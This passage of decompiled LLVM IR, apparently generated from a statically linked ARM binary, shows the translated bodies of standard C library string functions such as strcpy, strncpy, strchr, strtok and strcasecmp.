  %v0_26224 = phi i32 [ %v0_26220.pr, %dec_label_pc_26220thread-pre-split ], [ %v1_261f0, %dec_label_pc_261f0 ]
  %v2_26220 = icmp eq i32 %v0_26224, 0
  %v1_26224 = add i32 %v0_26224, -1
  store i32 %v1_26224, i32* %r2.global-to-local, align 4
  br i1 %v2_26220, label %dec_label_pc_2622c, label %dec_label_pc_261f8

dec_label_pc_2622c:                               ; preds = %bb63, %bb55, %bb51, %.thread6, %.thread, %bb66, %dec_label_pc_26220
  %v1_2622c = phi i32 [ 0, %.thread6 ], [ 0, %.thread ], [ %v3_261f8, %bb66 ], [ %v1_2622c37, %dec_label_pc_26220 ], [ %v4_261b8, %bb63 ], [ %v4_26164, %bb55 ], [ %v3_26144, %bb51 ]
  %v0_2622c = phi i32 [ %v3_261fc, %.thread6 ], [ %v3_26148, %.thread ], [ %v3_261fc, %bb66 ], [ %v0_2622c32, %dec_label_pc_26220 ], [ %v4_261bc, %bb63 ], [ %v4_26168, %bb55 ], [ %v3_26148, %bb51 ]
  %v2_2622c = sub i32 %v1_2622c, %v0_2622c
  br label %dec_label_pc_26230

dec_label_pc_26230:                               ; preds = %bb59, %dec_label_pc_2622c
  %storemerge = phi i32 [ %v2_2622c, %dec_label_pc_2622c ], [ %v2_26194, %bb59 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_26224, { 1, 0 }
  uselistorder i32 %v0_26218, { 1, 0 }
  uselistorder i32 %v1_261f0, { 1, 0 }
  uselistorder i32 %v1_261e0, { 1, 0 }
  uselistorder i32 %v0_26128, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_26230, { 1, 0 }
  uselistorder label %dec_label_pc_2622c, { 6, 5, 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_26220thread-pre-split, { 1, 0 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %v0_262481 = load i32, i32* @r1, align 4
  %v1_262482 = inttoptr i32 %v0_262481 to i8*
  %v2_262483 = load i8, i8* %v1_262482, align 1
  %v2_2624c5 = icmp eq i8 %v2_262483, 0
  store i1 %v2_2624c5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_262483, i8* %arg1, align 1
  br i1 %v2_2624c5, label %dec_label_pc_26258, label %dec_label_pc_26240

dec_label_pc_26240:                               ; preds = %entry, %dec_label_pc_26240
  %v0_26240 = load i32, i32* @r1, align 4
  %v1_26240 = add i32 %v0_26240, 1
  store i32 %v1_26240, i32* @r1, align 4
  %v0_26244 = load i32, i32* @r2, align 4
  %v1_26244 = add i32 %v0_26244, 1
  store i32 %v1_26244, i32* @r2, align 4
  %v1_26248 = inttoptr i32 %v1_26240 to i8*
  %v2_26248 = load i8, i8* %v1_26248, align 1
  %v2_2624c = icmp eq i8 %v2_26248, 0
  store i1 %v2_2624c, i1* %cpsr_z.global-to-local, align 1
  %v3_26250 = inttoptr i32 %v1_26244 to i8*
  store i8 %v2_26248, i8* %v3_26250, align 1
  %v0_26254 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_26254, label %dec_label_pc_26258, label %dec_label_pc_26240

dec_label_pc_26258:                               ; preds = %dec_label_pc_26240, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_26240, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_2625c = icmp eq i32 %arg2, 3
  store i1 %v7_2625c, i1* %cpsr_z.global-to-local, align 1
  %v0_26260 = load i32, i32* @lr, align 4
  store i32 %v0_26260, i32* %stack_var_-4, align 4
  %v1_26264 = add i32 %arg1, -1
  store i32 %v1_26264, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_262e0, label %dec_label_pc_2626c

dec_label_pc_2626c:                               ; preds = %entry
  %v3_2626c = udiv i32 %arg2, 4
  store i32 %v3_2626c, i32* %lr.global-to-local, align 4
  %v0_26270.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_26270

dec_label_pc_26270:                               ; preds = %dec_label_pc_262bc, %dec_label_pc_2626c
  %v2_26278 = phi i32 [ %v6_262b0, %dec_label_pc_262bc ], [ %v1_26264, %dec_label_pc_2626c ]
  %v0_26270 = phi i32 [ %v1_262c0, %dec_label_pc_262bc ], [ %v0_26270.pre, %dec_label_pc_2626c ]
  %v1_26270 = inttoptr i32 %v0_26270 to i8*
  %v2_26270 = load i8, i8* %v1_26270, align 1
  %v2_26274 = icmp eq i8 %v2_26270, 0
  store i1 %v2_26274, i1* %cpsr_z.global-to-local, align 1
  %v3_26278 = add i32 %v2_26278, 1
  %v4_26278 = inttoptr i32 %v3_26278 to i8*
  store i8 %v2_26270, i8* %v4_26278, align 1
  %v5_26278 = load i32, i32* @ip, align 4
  %v6_26278 = add i32 %v5_26278, 1
  store i32 %v6_26278, i32* @ip, align 4
  %v0_2627c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2627c, label %dec_label_pc_262cc, label %dec_label_pc_26280

dec_label_pc_26280:                               ; preds = %dec_label_pc_26270
  %v0_26280 = load i32, i32* @r1, align 4
  %v1_26280 = add i32 %v0_26280, 1
  %v2_26280 = inttoptr i32 %v1_26280 to i8*
  %v3_26280 = load i8, i8* %v2_26280, align 1
  %v2_26284 = icmp eq i8 %v3_26280, 0
  store i1 %v2_26284, i1* %cpsr_z.global-to-local, align 1
  %v3_26288 = add i32 %v5_26278, 2
  %v4_26288 = inttoptr i32 %v3_26288 to i8*
  store i8 %v3_26280, i8* %v4_26288, align 1
  %v5_26288 = load i32, i32* @ip, align 4
  %v6_26288 = add i32 %v5_26288, 1
  store i32 %v6_26288, i32* @ip, align 4
  %v0_2628c = load i32, i32* @r1, align 4
  %v1_2628c = add i32 %v0_2628c, 1
  store i32 %v1_2628c, i32* %r1.global-to-local, align 4
  %v0_26290 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_26290, label %dec_label_pc_262cc, label %dec_label_pc_26294

dec_label_pc_26294:                               ; preds = %dec_label_pc_26280
  %v1_26294 = add i32 %v0_2628c, 2
  %v2_26294 = inttoptr i32 %v1_26294 to i8*
  %v3_26294 = load i8, i8* %v2_26294, align 1
  %v2_26298 = icmp eq i8 %v3_26294, 0
  store i1 %v2_26298, i1* %cpsr_z.global-to-local, align 1
  %v3_2629c = add i32 %v5_26288, 2
  %v4_2629c = inttoptr i32 %v3_2629c to i8*
  store i8 %v3_26294, i8* %v4_2629c, align 1
  %v5_2629c = load i32, i32* @ip, align 4
  %v6_2629c = add i32 %v5_2629c, 1
  store i32 %v6_2629c, i32* @ip, align 4
  %v0_262a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_262a0 = add i32 %v0_262a0, 1
  store i32 %v1_262a0, i32* %r1.global-to-local, align 4
  %v0_262a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_262a4, label %dec_label_pc_262cc, label %dec_label_pc_262a8

dec_label_pc_262a8:                               ; preds = %dec_label_pc_26294
  %v1_262a8 = add i32 %v0_262a0, 2
  %v2_262a8 = inttoptr i32 %v1_262a8 to i8*
  %v3_262a8 = load i8, i8* %v2_262a8, align 1
  %v2_262ac = icmp eq i8 %v3_262a8, 0
  store i1 %v2_262ac, i1* %cpsr_z.global-to-local, align 1
  %v3_262b0 = add i32 %v5_2629c, 2
  %v4_262b0 = inttoptr i32 %v3_262b0 to i8*
  store i8 %v3_262a8, i8* %v4_262b0, align 1
  %v5_262b0 = load i32, i32* @ip, align 4
  %v6_262b0 = add i32 %v5_262b0, 1
  store i32 %v6_262b0, i32* @ip, align 4
  %v0_262b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_262b4 = add i32 %v0_262b4, 1
  store i32 %v1_262b4, i32* %r1.global-to-local, align 4
  %v0_262b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_262b8, label %dec_label_pc_262cc, label %dec_label_pc_262bc

dec_label_pc_262bc:                               ; preds = %dec_label_pc_262a8
  %v0_262bc = load i32, i32* %lr.global-to-local, align 4
  %v1_262bc = add i32 %v0_262bc, -1
  store i32 %v1_262bc, i32* %lr.global-to-local, align 4
  %v7_262bc = icmp eq i32 %v0_262bc, 1
  store i1 %v7_262bc, i1* %cpsr_z.global-to-local, align 1
  %v1_262c0 = add i32 %v0_262b4, 2
  store i32 %v1_262c0, i32* @r1, align 4
  br i1 %v7_262bc, label %dec_label_pc_262e0, label %dec_label_pc_26270

dec_label_pc_262cc:                               ; preds = %dec_label_pc_262a8, %dec_label_pc_26294, %dec_label_pc_26280, %dec_label_pc_26270
  %v1_262cc = phi i32 [ %v6_262b0, %dec_label_pc_262a8 ], [ %v6_2629c, %dec_label_pc_26294 ], [ %v6_26288, %dec_label_pc_26280 ], [ %v6_26278, %dec_label_pc_26270 ]
  %v2_262cc1 = sub i32 %arg1, %v1_262cc
  %v2_262d0 = add i32 %v2_262cc1, %arg2
  %v1_262d4 = add i32 %v2_262d0, -1
  store i32 %v1_262d4, i32* @r3, align 4
  %v7_262d4 = icmp eq i32 %v2_262d0, 1
  store i1 %v7_262d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_262d4, label %dec_label_pc_26310, label %dec_label_pc_26300

dec_label_pc_262e0:                               ; preds = %dec_label_pc_262bc, %entry
  %v2_262f07 = phi i32 [ %v1_26264, %entry ], [ %v6_262b0, %dec_label_pc_262bc ]
  %v1_262e0 = urem i32 %arg2, 4
  store i32 %v1_262e0, i32* @r3, align 4
  %v2_262e0 = icmp eq i32 %v1_262e0, 0
  store i1 %v2_262e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_262e0, label %dec_label_pc_26310, label %dec_label_pc_262e8

dec_label_pc_262e8:                               ; preds = %dec_label_pc_262e0, %dec_label_pc_262f8.dec_label_pc_262e8_crit_edge
  %v2_262f0 = phi i32 [ %v6_262f0, %dec_label_pc_262f8.dec_label_pc_262e8_crit_edge ], [ %v2_262f07, %dec_label_pc_262e0 ]
  %v0_262ec = phi i32 [ %v0_262ec.pre, %dec_label_pc_262f8.dec_label_pc_262e8_crit_edge ], [ %v1_262e0, %dec_label_pc_262e0 ]
  %v0_262e8 = load i32, i32* @r1, align 4
  %v1_262e8 = inttoptr i32 %v0_262e8 to i8*
  %v2_262e8 = load i8, i8* %v1_262e8, align 1
  %v3_262e8 = zext i8 %v2_262e8 to i32
  store i32 %v3_262e8, i32* %r2.global-to-local, align 4
  %v5_262e8 = add i32 %v0_262e8, 1
  store i32 %v5_262e8, i32* @r1, align 4
  %v1_262ec = add i32 %v0_262ec, -1
  store i32 %v1_262ec, i32* @r3, align 4
  %v7_262ec = icmp eq i32 %v0_262ec, 1
  store i1 %v7_262ec, i1* %cpsr_z.global-to-local, align 1
  %v3_262f0 = add i32 %v2_262f0, 1
  %v4_262f0 = inttoptr i32 %v3_262f0 to i8*
  store i8 %v2_262e8, i8* %v4_262f0, align 1
  %v5_262f0 = load i32, i32* @ip, align 4
  %v6_262f0 = add i32 %v5_262f0, 1
  store i32 %v6_262f0, i32* @ip, align 4
  %v0_262f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_262f4, label %dec_label_pc_26310, label %dec_label_pc_262f8

dec_label_pc_262f8:                               ; preds = %dec_label_pc_262e8
  %v0_262f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_262f8 = icmp eq i32 %v0_262f8, 0
  store i1 %v2_262f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_262f8, label %dec_label_pc_26300, label %dec_label_pc_262f8.dec_label_pc_262e8_crit_edge

dec_label_pc_262f8.dec_label_pc_262e8_crit_edge:  ; preds = %dec_label_pc_262f8
  %v0_262ec.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_262e8

dec_label_pc_26300:                               ; preds = %dec_label_pc_262f8, %dec_label_pc_262cc
  %v2_2630810 = phi i32 [ %v1_262cc, %dec_label_pc_262cc ], [ %v6_262f0, %dec_label_pc_262f8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_26304

dec_label_pc_26304:                               ; preds = %dec_label_pc_26304.dec_label_pc_26304_crit_edge, %dec_label_pc_26300
  %v2_26308 = phi i32 [ %v6_26308, %dec_label_pc_26304.dec_label_pc_26304_crit_edge ], [ %v2_2630810, %dec_label_pc_26300 ]
  %v0_26308.off0 = phi i8 [ %extract.t, %dec_label_pc_26304.dec_label_pc_26304_crit_edge ], [ 0, %dec_label_pc_26300 ]
  %v0_26304 = load i32, i32* @r3, align 4
  %v1_26304 = add i32 %v0_26304, -1
  store i32 %v1_26304, i32* @r3, align 4
  %v7_26304 = icmp eq i32 %v0_26304, 1
  store i1 %v7_26304, i1* %cpsr_z.global-to-local, align 1
  %v3_26308 = add i32 %v2_26308, 1
  %v4_26308 = inttoptr i32 %v3_26308 to i8*
  store i8 %v0_26308.off0, i8* %v4_26308, align 1
  %v5_26308 = load i32, i32* @ip, align 4
  %v6_26308 = add i32 %v5_26308, 1
  store i32 %v6_26308, i32* @ip, align 4
  %v0_2630c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2630c, label %dec_label_pc_26310, label %dec_label_pc_26304.dec_label_pc_26304_crit_edge

dec_label_pc_26304.dec_label_pc_26304_crit_edge:  ; preds = %dec_label_pc_26304
  %v0_26308.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_26308.pre to i8
  br label %dec_label_pc_26304

dec_label_pc_26310:                               ; preds = %dec_label_pc_262e8, %dec_label_pc_26304, %dec_label_pc_262cc, %dec_label_pc_262e0
  %v2_26310 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_26310, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_26308, { 1, 0 }
  uselistorder i32 %v0_26304, { 1, 0 }
  uselistorder i32 %v6_262f0, { 0, 2, 1 }
  uselistorder i32 %v1_262e0, { 2, 1, 0 }
  uselistorder i32 %v2_262d0, { 1, 0 }
  uselistorder i32 %v1_262c0, { 1, 0 }
  uselistorder i32 %v0_262bc, { 1, 0 }
  uselistorder i32 %v6_262b0, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_26310, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_262e8, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_2631c = urem i32 %arg1, 256
  %v0_2633c3 = load i32, i32* @r0, align 4
  %v1_2633c4 = urem i32 %v0_2633c3, 4
  %v2_2633c5 = icmp eq i32 %v1_2633c4, 0
  br i1 %v2_2633c5, label %dec_label_pc_26344, label %dec_label_pc_26324

dec_label_pc_26324:                               ; preds = %entry, %dec_label_pc_26338
  %v0_26338 = phi i32 [ %v1_26338, %dec_label_pc_26338 ], [ %v0_2633c3, %entry ]
  %v1_26324 = inttoptr i32 %v0_26338 to i8*
  %v2_26324 = load i8, i8* %v1_26324, align 1
  %v3_26324 = zext i8 %v2_26324 to i32
  store i32 %v3_26324, i32* @r3, align 4
  %v9_26328 = icmp eq i32 %v3_26324, %v1_2631c
  br i1 %v9_26328, label %dec_label_pc_263f8, label %dec_label_pc_26330

dec_label_pc_26330:                               ; preds = %dec_label_pc_26324
  %v2_26330 = icmp eq i8 %v2_26324, 0
  br i1 %v2_26330, label %dec_label_pc_263f4, label %dec_label_pc_26338

dec_label_pc_26338:                               ; preds = %dec_label_pc_26330
  %v1_26338 = add i32 %v0_26338, 1
  %v1_2633c = urem i32 %v1_26338, 4
  %v2_2633c = icmp eq i32 %v1_2633c, 0
  br i1 %v2_2633c, label %dec_label_pc_26344, label %dec_label_pc_26324

dec_label_pc_26344:                               ; preds = %dec_label_pc_26338, %entry
  %v0_26348 = phi i32 [ %v0_2633c3, %entry ], [ %v1_26338, %dec_label_pc_26338 ]
  %v4_26344 = mul nuw nsw i32 %v1_2631c, 256
  %v5_26344 = or i32 %v4_26344, %v1_2631c
  %v4_2634c = mul i32 %v5_26344, 65536
  %v5_2634c = or i32 %v4_2634c, %v5_26344
  br label %dec_label_pc_26350

dec_label_pc_26350:                               ; preds = %dec_label_pc_263ec, %dec_label_pc_2638c, %dec_label_pc_26344
  %v0_263b4 = phi i32 [ %v0_26348, %dec_label_pc_26344 ], [ %v4_26350, %dec_label_pc_2638c ], [ %v4_26350, %dec_label_pc_263ec ]
  %v1_26350 = inttoptr i32 %v0_263b4 to i32*
  %v2_26350 = load i32, i32* %v1_26350, align 4
  %v4_26350 = add i32 %v0_263b4, 4
  %v2_26358 = xor i32 %v2_26350, %v5_2634c
  %v2_2635c = add i32 %v2_26358, 2130640639
  store i32 %v2_2635c, i32* @ip, align 4
  %v2_26364 = add i32 %v2_26350, 2130640639
  %v1_26368 = sub i32 -1, %v2_26350
  %v2_2636c = xor i32 %v2_26364, %v1_26368
  %v2_26378 = and i32 %v2_2636c, -2130640640
  %v2_26380 = icmp eq i32 %v2_26378, 0
  br i1 %v2_26380, label %dec_label_pc_2638c, label %dec_label_pc_26394

dec_label_pc_2638c:                               ; preds = %dec_label_pc_26350
  %v1_26374 = sub i32 -1, %v2_26358
  %v2_2637c = xor i32 %v2_2635c, %v1_26374
  %v2_26384 = and i32 %v2_2637c, -2130640640
  %v2_2638c = icmp eq i32 %v2_26384, 0
  br i1 %v2_2638c, label %dec_label_pc_26350, label %dec_label_pc_26394

dec_label_pc_26394:                               ; preds = %dec_label_pc_26350, %dec_label_pc_2638c
  %v2_26394 = inttoptr i32 %v0_263b4 to i8*
  %v3_26394 = load i8, i8* %v2_26394, align 1
  %v4_26394 = zext i8 %v3_26394 to i32
  store i32 %v4_26394, i32* @r3, align 4
  %v9_26398 = icmp eq i32 %v4_26394, %v1_2631c
  br i1 %v9_26398, label %dec_label_pc_263f8, label %dec_label_pc_263a4

dec_label_pc_263a4:                               ; preds = %dec_label_pc_26394
  %v2_263a4 = icmp eq i8 %v3_26394, 0
  br i1 %v2_263a4, label %dec_label_pc_263f4, label %dec_label_pc_263ac

dec_label_pc_263ac:                               ; preds = %dec_label_pc_263a4
  %v1_263ac = add i32 %v0_263b4, 1
  %v2_263ac = inttoptr i32 %v1_263ac to i8*
  %v3_263ac = load i8, i8* %v2_263ac, align 1
  %v4_263ac = zext i8 %v3_263ac to i32
  store i32 %v4_263ac, i32* @r3, align 4
  %v9_263b0 = icmp eq i32 %v4_263ac, %v1_2631c
  br i1 %v9_263b0, label %dec_label_pc_263f8, label %dec_label_pc_263bc

dec_label_pc_263bc:                               ; preds = %dec_label_pc_263ac
  %v2_263bc = icmp eq i8 %v3_263ac, 0
  br i1 %v2_263bc, label %dec_label_pc_263f4, label %dec_label_pc_263c4

dec_label_pc_263c4:                               ; preds = %dec_label_pc_263bc
  %v1_263c4 = add i32 %v0_263b4, 2
  %v2_263c4 = inttoptr i32 %v1_263c4 to i8*
  %v3_263c4 = load i8, i8* %v2_263c4, align 1
  %v4_263c4 = zext i8 %v3_263c4 to i32
  store i32 %v4_263c4, i32* @r3, align 4
  %v9_263c8 = icmp eq i32 %v4_263c4, %v1_2631c
  br i1 %v9_263c8, label %dec_label_pc_263f8, label %dec_label_pc_263d4

dec_label_pc_263d4:                               ; preds = %dec_label_pc_263c4
  %v2_263d4 = icmp eq i8 %v3_263c4, 0
  br i1 %v2_263d4, label %dec_label_pc_263f4, label %dec_label_pc_263dc

dec_label_pc_263dc:                               ; preds = %dec_label_pc_263d4
  %v1_263dc = add i32 %v0_263b4, 3
  %v2_263dc = inttoptr i32 %v1_263dc to i8*
  %v3_263dc = load i8, i8* %v2_263dc, align 1
  %v4_263dc = zext i8 %v3_263dc to i32
  store i32 %v4_263dc, i32* @r3, align 4
  %v9_263e0 = icmp eq i32 %v4_263dc, %v1_2631c
  br i1 %v9_263e0, label %dec_label_pc_263f8, label %dec_label_pc_263ec

dec_label_pc_263ec:                               ; preds = %dec_label_pc_263dc
  %v2_263ec = icmp eq i8 %v3_263dc, 0
  br i1 %v2_263ec, label %dec_label_pc_263f4, label %dec_label_pc_26350

dec_label_pc_263f4:                               ; preds = %dec_label_pc_26330, %dec_label_pc_263ec, %dec_label_pc_263d4, %dec_label_pc_263bc, %dec_label_pc_263a4
  br label %dec_label_pc_263f8

dec_label_pc_263f8:                               ; preds = %dec_label_pc_26324, %dec_label_pc_263dc, %dec_label_pc_263c4, %dec_label_pc_263ac, %dec_label_pc_26394, %dec_label_pc_263f4
  %v1_263fc = phi i32 [ 0, %dec_label_pc_263f4 ], [ %v1_263dc, %dec_label_pc_263dc ], [ %v1_263c4, %dec_label_pc_263c4 ], [ %v1_263ac, %dec_label_pc_263ac ], [ %v0_263b4, %dec_label_pc_26394 ], [ %v0_26338, %dec_label_pc_26324 ]
  ret i32 %v1_263fc

; uselistorder directives
  uselistorder i32 %v4_26350, { 1, 0 }
  uselistorder i32 %v2_26350, { 0, 2, 1 }
  uselistorder i32 %v0_263b4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_26344, { 1, 0 }
  uselistorder i32 %v1_26338, { 1, 0, 2 }
  uselistorder i32 %v0_2633c3, { 2, 1, 0 }
  uselistorder i32 %v1_2631c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_263f8, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_263f4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_26394, { 1, 0 }
  uselistorder label %dec_label_pc_26324, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v3_26408 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_26410 = call i32 @__xpg_strerror_r()
  %v0_26414 = load i32, i32* @r4, align 4
  store i32 %v3_26408, i32* @r4, align 4
  ret i32 %v0_26414
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55196), i32* @r2, align 4
  %v0_26438 = call i32 @strtok_r()
  ret i32 %v0_26438
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_2646c

dec_label_pc_2646c:                               ; preds = %dec_label_pc_26498, %entry
  %v1_264b08 = phi i32 [ %v1_264b09, %dec_label_pc_26498 ], [ 0, %entry ]
  %v0_264a0 = phi i32 [ %v1_264a0, %dec_label_pc_26498 ], [ %arg2, %entry ]
  %v0_264a4 = phi i32 [ %v1_264a4, %dec_label_pc_26498 ], [ %tmp, %entry ]
  %v9_2646c = icmp eq i32 %v0_264a4, %v0_264a0
  %.pre = inttoptr i32 %v0_264a4 to i8*
  br i1 %v9_2646c, label %dec_label_pc_26498, label %dec_label_pc_26474

dec_label_pc_26474:                               ; preds = %dec_label_pc_2646c
  %v2_26474 = load i8, i8* %.pre, align 1
  %v3_26474 = zext i8 %v2_26474 to i32
  %v1_26478 = inttoptr i32 %v0_264a0 to i8*
  %v2_26478 = load i8, i8* %v1_26478, align 1
  %v3_26478 = zext i8 %v2_26478 to i32
  %v4_2647c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20836) to i32*), align 4
  %v2_26480 = mul nuw nsw i32 %v3_26478, 2
  %v2_26484 = mul nuw nsw i32 %v3_26474, 2
  %v2_26488 = add i32 %v4_2647c, %v2_26480
  %v3_26488 = inttoptr i32 %v2_26488 to i16*
  %v4_26488 = load i16, i16* %v3_26488, align 2
  %v6_26488 = sext i16 %v4_26488 to i32
  %v2_2648c = add i32 %v4_2647c, %v2_26484
  %v3_2648c = inttoptr i32 %v2_2648c to i16*
  %v4_2648c = load i16, i16* %v3_2648c, align 2
  %v6_2648c = sext i16 %v4_2648c to i32
  %v2_26490 = sub nsw i32 %v6_2648c, %v6_26488
  %v9_26490 = icmp eq i16 %v4_2648c, %v4_26488
  br i1 %v9_26490, label %dec_label_pc_26498, label %dec_label_pc_264ac

dec_label_pc_26498:                               ; preds = %dec_label_pc_2646c, %dec_label_pc_26474
  %v1_264b09 = phi i32 [ %v2_26490, %dec_label_pc_26474 ], [ %v1_264b08, %dec_label_pc_2646c ]
  %v2_26498 = load i8, i8* %.pre, align 1
  %v2_2649c = icmp eq i8 %v2_26498, 0
  %v1_264a0 = add i32 %v0_264a0, 1
  %v1_264a4 = add i32 %v0_264a4, 1
  store i32 %v1_264a4, i32* @ip, align 4
  br i1 %v2_2649c, label %dec_label_pc_264ac, label %dec_label_pc_2646c

dec_label_pc_264ac:                               ; preds = %dec_label_pc_26498, %dec_label_pc_26474
  %v1_264b0 = phi i32 [ %v1_264b09, %dec_label_pc_26498 ], [ %v2_26490, %dec_label_pc_26474 ]
  ret i32 %v1_264b0

; uselistorder directives
  uselistorder i32 %v1_264a4, { 1, 0 }
  uselistorder i32 %v2_26490, { 1, 0 }
  uselistorder i32 %v0_264a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_26498, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_264bc = load i32, i32* @r4, align 4
  %v9_264bc = load i32, i32* @r6, align 4
  %v12_264bc = load i32, i32* @r7, align 4
  %v0_264c4 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  store i32 %v0_264c4, i32* @ip, align 4
  %v0_264d4 = load i32, i32* @r1, align 4
  store i32 %v0_264d4, i32* @r7, align 4
  %v0_264d8 = load i32, i32* @r2, align 4
  store i32 %v0_264d8, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_264c4, 124
  br i1 %tmp, label %dec_label_pc_26510, label %dec_label_pc_264e0

dec_label_pc_264e0:                               ; preds = %entry
  br label %dec_label_pc_264f8

dec_label_pc_264ec:                               ; preds = %dec_label_pc_264f8
  br i1 %v2_26504, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_264ec
  %v2_264f0 = add i32 %v1_26508, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_264ec, %bb
  %v0_264f81 = phi i32 [ %v1_26508, %dec_label_pc_264ec ], [ %v2_264f0, %bb ]
  %v1_264f4 = add i32 %v0_264f4, 1
  br label %dec_label_pc_264f8

dec_label_pc_264f8:                               ; preds = %dec_label_pc_264e0, %bb15
  %v1_26508 = phi i32 [ %v0_264c4, %dec_label_pc_264e0 ], [ %v0_264f81, %bb15 ]
  %v0_264f4 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39276), %dec_label_pc_264e0 ], [ %v1_264f4, %bb15 ]
  store i32 %v0_264f4, i32* @r5, align 4
  %v2_264f8 = icmp eq i32 %v1_26508, 0
  %v1_264fc = inttoptr i32 %v0_264f4 to i8*
  %v2_264fc = load i8, i8* %v1_264fc, align 1
  %v3_264fc = zext i8 %v2_264fc to i32
  store i32 %v3_264fc, i32* @r3, align 4
  %v2_26504 = icmp eq i8 %v2_264fc, 0
  br i1 %v2_264f8, label %dec_label_pc_26504, label %dec_label_pc_264ec

dec_label_pc_26504:                               ; preds = %dec_label_pc_264f8
  br i1 %v2_26504, label %dec_label_pc_26510, label %bb16

bb16:                                             ; preds = %dec_label_pc_26504
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2654c

dec_label_pc_26510:                               ; preds = %dec_label_pc_26504, %entry
  store i32 %v0_264c4, i32* @r2, align 4
  %v3_26518 = ashr i32 %v0_264c4, 31
  store i32 %v3_26518, i32* @r3, align 4
  %v6_2652c = bitcast i32* %stack_var_-25 to i8*
  %v7_2652c = call i32 @_uintmaxtostr(i8* %v6_2652c)
  %v1_26534 = add i32 %v7_2652c, -14
  store i32 %v1_26534, i32* @r5, align 4
  %v0_26538 = load i32, i32* @r6, align 4
  %v2_26538 = add i32 %v0_26538, -39292
  store i32 %v2_26538, i32* @r1, align 4
  store i32 %v1_26534, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_26544 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
